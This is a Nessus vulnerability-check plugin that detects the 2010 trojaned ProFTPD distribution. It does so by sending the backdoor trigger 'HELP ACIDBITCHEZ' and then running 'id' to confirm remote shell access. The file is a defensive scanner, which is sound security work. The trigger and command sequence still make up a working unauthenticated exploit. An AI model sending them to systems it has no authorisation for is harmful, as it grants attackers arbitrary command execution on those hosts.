#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(50989);
  script_version("$Revision: 1.9 $");
  script_cvs_date("$Date: 2011/12/05 17:40:21 $");

  script_bugtraq_id(45150);
  script_osvdb_id(69562);
  script_xref(name:"EDB-ID", value:"15662");

  script_name(english:"ProFTPD Compromised Source Packages Trojaned Distribution");
  script_summary(english:"Tries to run a command");
 
  script_set_attribute(
    attribute:"synopsis",
    value:
"The FTP server contains a backdoor allowing execution of arbitrary
code."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote host is using ProFTPD, a free FTP server for Unix and
Linux. 

The version of ProFTPD installed on the remote host has been compiled
with a backdoor in 'src/help.c', apparently related to a compromise of
the main distribution server for the ProFTPD project on the 28th of
November 2010 around 20:00 UTC and not addressed until the 2nd of
December 2010. 

By sending a special HELP command, an unauthenticated, remote attacker
can gain a shell and execute arbitrary commands with system
privileges. 

Note that the compromised distribution file also contained code that
ran as part of the initial configuration step and sent a special HTTP
request to a server in Saudi Arabia.  If this install was built from
source, you should assume that the author of the backdoor is already
aware of it."
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.theregister.co.uk/2010/12/02/proftpd_backdoored/"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://xorl.wordpress.com/2010/12/02/news-proftpd-owned-and-backdoored/"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.nessus.org/u?74de525d"
  );
  script_set_attribute(
    attribute:"solution",
    value:"Reinstall the host from known, good sources."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'ProFTPD-1.3.3c Backdoor Command Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date",value:"2010/12/02");
  script_set_attribute(attribute:"patch_publication_date",value:"2010/12/02");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/12/06");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:proftpd:proftpd");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"FTP");
  
  script_copyright(english:"This script is Copyright (C) 2010-2011 Tenable Network Security, Inc.");

  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);

  exit(0);
}


include("ftp_func.inc");
include("global_settings.inc");
include("misc_func.inc");


port = get_ftp_port(default: 21);

soc = open_sock_tcp(port);
if (!soc) exit(1, "Failed to open a socket on port "+port+".");


# Unless we're paranoid, make sure this is ProFTPD.
if (report_paranoia < 2)
{
  banner = get_ftp_banner(port:port);
  if (!banner) exit(1, "Unable to obtain FTP banner on port "+port+".");
  if (
   " ProFTPD" >!< banner && 
    "(ProFTPD)" >!< banner && 
    "220 FTP Server ready" >!< banner
  ) exit(1, "The FTP service on port "+port+" does not appear to be ProFTPD.");
}


# Try to exploit the issue.
cmd = 'id';
cmd_pat = 'uid=[0-9]+.*gid=[0-9]+.*';

banner = ftp_recv_line(socket:soc);

c = 'HELP ACIDBIT' + 'CHEZ';
s = ftp_send_cmd(socket:soc, cmd:c);

if (strlen(s) == 0)
{
  send(socket:soc, data:cmd+';'+'\r\n');
  info = "";
  n = 0;
  while (1 && n < 100)
  {
    s = recv_line(socket:soc, length:65535);
    if (s) info += chomp(s) + '\n';
    else break;
    n++;
  }

  if (info && egrep(pattern:cmd_pat, string:info))
  {
    if (report_verbosity > 0)
    {
      report = 
        '\n' +
        'Nessus was able to exploit the issue to execute the command \'' + cmd + '\'\n' +
        'on the remote host using the following FTP commands :\n' +
        '\n' +
        '  - ' + c + '\n' +
        '    ' + cmd + ';' + '\n';
      if (report_verbosity > 1)
      {
        report += 
          '\n' +
          'It produced the following output :\n' +
          '\n' +
          crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
          info +
          crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
      }
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}

ftp_close(socket:soc);
exit(0, "The FTP server on "+port+" does not appear to be affected.");
